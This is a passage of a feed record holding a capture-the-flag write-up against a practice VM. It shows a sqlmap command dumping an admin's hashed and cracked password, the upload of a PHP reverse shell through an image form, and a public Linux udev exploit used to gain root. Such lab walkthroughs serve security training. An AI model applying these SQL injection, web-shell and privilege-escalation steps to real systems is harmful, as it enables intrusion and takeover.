class=\"s2\">\"http://192.168.221.131/?action=login\"</span> <span class=\"nt\">--forms</span>  <span class=\"nt\">-D</span> cms\n<span class=\"nt\">-T</span> user <span class=\"nt\">--dump</span>\n\nDatabase: cms\nTable: user\n<span class=\"o\">[</span>1 entry]\n+---------+---------------+----------------------------------------------+\n| user_id | user_username | user_password                                |\n+---------+---------------+----------------------------------------------+\n| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 <span class=\"o\">(</span>adminpass<span class=\"o\">)</span> |\n+---------+---------------+----------------------------------------------+</code></pre> \n</figure> \n<h2 id=\"web-application-exploitation\">Web Application Exploitation</h2> \n<p>Using the previously discovered admin account credentials, it was possible to login to the web application and upload a php reverse shell using an image upload form.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf6/webshell.png\" alt=\"PHP Web Shell Upload\" /></p> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>A successful reverse shell was establish and the kernel appeared to be vulnerable to a well know <a href=\"https://www.exploit-db.com/exploits/8478/\">Linux 2.6 kernel udev exploit</a>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-3.2<span class=\"nv\">$ </span><span class=\"nb\">uname</span> <span class=\"nt\">-ar</span>\nLinux localhost.localdomain 2.6.18-92.el5 <span class=\"c\">#1 SMP Tue Jun 10 18:49:47 EDT 2008</span>\ni686 i686 i386 GNU/Linux</code></pre> \n</figure> \n<p>The exploit requires the PID for the udev process, the exploit does not work flawlessly as you can see below it may take several attempts to get a root shell.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf6/exploit-process-udev-pid.png\" alt=\"Exploit Process UDEV PID\" /></p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Tue, 04 Mar 2014 19:40:59 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/ctf6/webshell.png","linkMd5":"e7bba9bd73311d036bb4e2449df71f9c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn80@2020_3/2020/08/25/01-24-54-482_287392db9f109815.webp","destWidth":766,"destHeight":770,"sourceBytes":80388,"destBytes":58918,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/ctf6/webshell.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn80@2020_3/2020/08/25/01-24-54-482_287392db9f109815.webp","https://highon.coffee/img/blog/ctf6/exploit-process-udev-pid.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn15@2020_4/2020/08/25/01-25-14-773_1aa2466883c9c07a.webp"},"publishedOrCreatedDate":1598318675558},{"createdTime":"2020-08-25
